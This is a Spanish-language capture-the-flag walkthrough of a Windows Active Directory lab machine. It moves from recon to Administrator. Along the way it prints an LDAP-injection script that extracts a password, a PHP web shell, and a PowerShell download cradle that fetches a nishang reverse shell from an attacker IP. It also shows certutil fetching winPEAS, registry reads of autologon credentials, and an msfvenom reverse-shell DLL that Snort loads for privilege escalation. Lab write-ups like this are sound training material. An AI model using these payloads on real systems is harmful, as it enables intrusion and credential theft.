#ActiveDirectory #windows #hard 
### Ping


```python
ping -c 1 10.10.11.250
PING 10.10.11.250 (10.10.11.250) 56(84) bytes of data.
64 bytes from 10.10.11.250: icmp_seq=1 ttl=127 time=159 ms

--- 10.10.11.250 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 158.592/158.592/158.592/0.000 ms
```

### TTL = 127 windows

### nmap

```python
# Nmap 7.94SVN scan initiated Tue Jul 23 11:36:29 2024 as: nmap -p- -open -sCV --min-rate 5000 -n -Pn -oN Scan 10.10.11.250
Nmap scan report for 10.10.11.250
Host is up (0.16s latency).
Not shown: 64977 closed tcp ports (reset), 530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-23 15:36:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=7/23%Time=669FCE1B%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\
SF:0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(SSLSe
SF:ssionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88
SF:'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,9,"\x05
SF:\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1
SF:e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(L
SF:PDString,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20m
SF:essage\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0
SF:\0\0\x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20proto
SF:buf\x20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x
SF:88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle
SF:-tns,32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:16Invalid\x20message-frame\.\"\x05HY000")%r(afp,2B,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x0
SF:5HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-23T15:37:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 23 11:38:13 2024 -- 1 IP address (1 host up) scanned in 104.43 seconds
```

### Enumeración puerto 80 (http)
analizamos la web pero no encontramos nada demasiado interesante
![[Pasted image 20240723132110.png]]

### Fuzzing virtual hosts con gobuster
haciendo fuzzing podemos descubrir dominios de los cuales `bat` me llama la atencion
![[Pasted image 20240723142524.png]]

`no tenemos directory listeng por lo que no podremos ver estos dominios`
![[Pasted image 20240723142720.png]]

### Fuzzing con wfuzz
haciendo fuzzing para subdominios podemos encontrar un subdominio llamado `internal` pero no tenemos acceso
![[Pasted image 20240723140824.png]]

### Fuzzing con gobuster
en el nuevo subdominio que hemos encontrado podemos realizar  fuzzing y encontrar mas dominios pero seguimos sin tener acceso. debido a que la pagina esta formato `PHP` podemos intentar listar todos los archivos que tengan la extensión `.php`
![[Pasted image 20240723143208.png]]

### Fuzzing con gobuster
realizamos un nuevo ataque y encontramos la un archivo llamado `list.php`
![[Pasted image 20240723143817.png]]

`aqui nos indica que falta un parametro`
![[Pasted image 20240723144029.png]]

### wfuzz
vamos a realizar un nuevo escaneo de gobuster para intentar identificar cual es ese parámetro que podría llevarnos a algún lugar 

```python
❯ wfuzz -c --hc=404 --hh=17 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://internal.analysis.htb/users/list.php?FUZZ=algo'
```

![[Pasted image 20240723145637.png]]

`name=test`
al probar con un nombre de usuario como administrador no obtenemos nada sin embargo sabemos que si no le pasamos nada la palabra `CONTAC_` no aparece. lo cual me hace pensar que si existe un usuario valido lo remplazara por esta palabra 
![[Pasted image 20240723145843.png]]

### crackmapexec
realizamos esta enumeración para obtener el nombre del dominio aunque ya lo podemos ver en la captura de nmap y el nombre del `DC` 
![[Pasted image 20240723150414.png]]

### kerbrute
realizamos un ataque de kerbrute para intentar identificar usuarios validos
![[Pasted image 20240723150731.png]]

`users`
![[Pasted image 20240723155456.png]]

`inyecciones ldap`
debido a que identificamos que la web se comporta de manera extraña cuando usamos paréntesis `()` podemos identificar que es vulnerable a inyecciones ldap. si ponemos in `*` podemos enumerar un usuario
![[Pasted image 20240723151104.png]]

`ldap`
con el siguiente comando podemos enumerar otro usuario mas `name=a*`
![[Pasted image 20240723151430.png]]

### List of LDAP Attribute Names and Associated Name in Active Directory
para comprender mas a fundo todos los parámetros relacionados con ldap podemos ir al siguiente [Articulo](https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html). 

dado que tenemos inyecciones de parámetros ldap quiero imaginar que por detrás están ocurriendo de la siguiente forma. tomando en cuenta uno de los comandos del articulo 
```python
$(sAMAccountName=$_GET['name'])

# esto es lo que nos permite a nosotros hacer la siguiente query

$(sAMAccountName=a*)
```

de esta manera podemos confirmar que estamos ante inyecciones ldap y haciendo uso de los siguientes parámetros podemos construir nuestra propia query e intentar explotar esto 
![[Pasted image 20240723161119.png]]

`ejemplo`

```python
$(sAMAccountName=jingel)(sn=johnson)
```

en este caso la ultima parte del nombre la cambiamos por un `*` dado que sabemos que la query igual la validara y efectivamente obtenemos el valor completo

![[Pasted image 20240723163227.png]]

### impacket-GetNPUsers
con la lista de todos los usuarios que hemos encontrado podemos crear un diccionario e intentar realizar un ataque para capturar un `TGT` pero no tenemos éxito
![[Pasted image 20240723170728.png]]

### crackmapexec
haciendo una validación de usuarios de forma paralela tampoco logramos encontrar nada
![[Pasted image 20240723195506.png]]

### ldap-Injection
con este script vamos a enumerar la query `description` en la que efectivamente podemos listar la contraseñá

```python
#!/usr/bin/env python3

import requests
import re
import signal
import pdb
import time
import sys
import string

from termcolor import colored
from pwn import *

def def_handler(sig, frame):
print(colored("\n\n[!] Saliendo...\n", 'red'))
sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

main_url = 'http://internal.analysis.htb/users/list.php?name='
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + '.*&$%@#'

def ldap_injection():
p1 = log.progress("Ldap Injection")
p1.status("String Ldap Injections")

time.sleep(2)

p2 = log.progress("Description")

description = ""

for position in range(30):
for character in characters:
try:
p1.status(main_url + f"technician)(description={description}{character}*")
r = requests.get(main_url + f"technician)(description={description}{character}*")
username = re.findall(r'<strong>(.*?)</strong>', r.text)[0]

if "technician" in username:
description += character
p2.status(character)
break

except:
description += character
p2.status(character)
break

if __name__ == '__main__':

ldap_injection()
```

`Contraseña`
parece que el script ha hecho algo medio raro al final pero podríamos intentar hacer pruebas con esta contraseña
![[Pasted image 20240723220718.png]]

### crackmapexec
validamos las credenciales que hemos obtenido y son validas pero parece que el usuario pertenece al grupo `Remote Management Users` por lo cual no nos podemos conectar por evil-winrm
![[Pasted image 20240723221118.png]]

### ldapdomaindump
con esta herramienta vamos a dumpear todo el `ldapdomain` de esta manera obtenemos algunos archivos que haciendo un servidor en python podemos verlo desde el navegador web accediendo a nuestro localhost por el puerto especificado
![[Pasted image 20240723221815.png]]

`Remote Management Users`
filtrando por esta opción llamada `Utilisateurs de gestion á distance` que quiero pensar que es el grupo de administración remota. podemos ver que solo los usuarios `jdoe y wsmith` tienen este permiso
![[Pasted image 20240723222011.png]]

`http://internal.analysis.htb/employees/login.php`

![[Pasted image 20240723222611.png]]

`tikects`
tenemos un apartado con tickets donde algunos dan información interesante 
![[Pasted image 20240724150708.png]]

`SOC Report`
en esta parte arece que podemos enviar un archivo para el SOC en el AD Analysis
![[Pasted image 20240724151001.png]]

`Uploads`
haciendo un uploads de un archivo aleatorio obtenemos información sobre donde se esta subiendo ese archivo. parece que esto podemos explotarlo
![[Pasted image 20240724151339.png]]

### cmd.php
vamos a subir nuestro archivo para identificar si la pagina puede interpretarnos esto. 

```python
<?php
 echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
 ?>
```

![[Pasted image 20240724151934.png]]

`http://internal.analysis.htb/dashboard/uploads/cmd.php?cmd=whoami`
al subir el archivo solo debemos ir a la url y llamar al comando `cmd.php=` y podremos ejecutar comandos
![[Pasted image 20240724152856.png]]

### nishang
vamos a utilizar el repositorio de [nishang](https://github.com/samratashok/nishang.git) en este caso para lograr obtener una reverse shell usaremos el `Invoke-PowerShellTcp.ps1` y agregamos una pequeña linea al final para matar dos pájaros de un solo tiro
![[Pasted image 20240724154346.png]]

`WebClient`
llamamos el archivo desde la web con el siguiente comando

```python
powershell IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.73:9006/Invoke-PowerShellTcp.ps1')
```

![[Pasted image 20240724154838.png]]

`Server`
con un servidor compartimos el archivo para posteriormente llamarlo y obtener una conexión
![[Pasted image 20240724155109.png]]

### WinPEAS.exe
después de enumerar un buen rato el sistema no hemos encontrado un vector de ataque así que vamos a usar la herramienta `winpeas` para enumerar mas a fondo

```python
certutil.exe -f -urlcache -split http://10.10.14.73:9006/winPEASx64.exe
```

`.\WinPEAS.exe > Output.txt`
ejecutamos el WinPEAS.exe y guardamos el Output en un archivo .txt
![[Pasted image 20240724160615.png]]

`wget`
descargamos el Output.txt del archivo que acabamos de crear con el `winpeas` para poder verlo en nuestra maquina
![[Pasted image 20240724161848.png]]

`cat`
hacemos un cat para poder ver el archivo
![[Pasted image 20240724162001.png]]

`Autologon Credentials`
obtenemos las credenciales del usuario `jdoe` que estaban activas con el `autologon` 
![[Pasted image 20240724162710.png]]

`Validamos Credenciales`
![[Pasted image 20240724162924.png]]

### Evil-winrm
ahora podemos conectarnos con las credenciales del usuario `jdoe` también decir que esto podemos hacerlo con el siguiente comando

```python
cd HKLM:

cd "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Get-ItemProperty . | select-Object DefaultDomainName, DefaultUserName, DefaultPassword
```

![[Pasted image 20240724163031.png]]

### Escalada de privilegios
haciendo uso de la herramienta `snort` podemos realizar una explotación de privilegios usando el [Dynamic Modules] el cual ejecuta una variable llamada  [dynamicpreprocessor](http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html) 
![[Pasted image 20240724181036.png]]

### dll
vamos a crear un una nueva dll en este caso llamada `pwned.dll` utilizando `msfvenom`

```python
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.73 LPORT=9001 -f dll -o pwned.dll
```

![[Pasted image 20240724182545.png]]

`upload`
la subimos a la maquina victima usando el comando `upload` ya que estamos en la misma ruta donde hemos iniciado la sesión de `evil-winrm`

![[Pasted image 20240724182715.png]]

`Administrator`
en este punto solo debemos esperar un poco para que `snort` haga el llamado de todas sus `dll` y cuando ejecuta la nuestra podemos obtener la conexión 
![[Pasted image 20240724183338.png]]

### WE ARE ROOT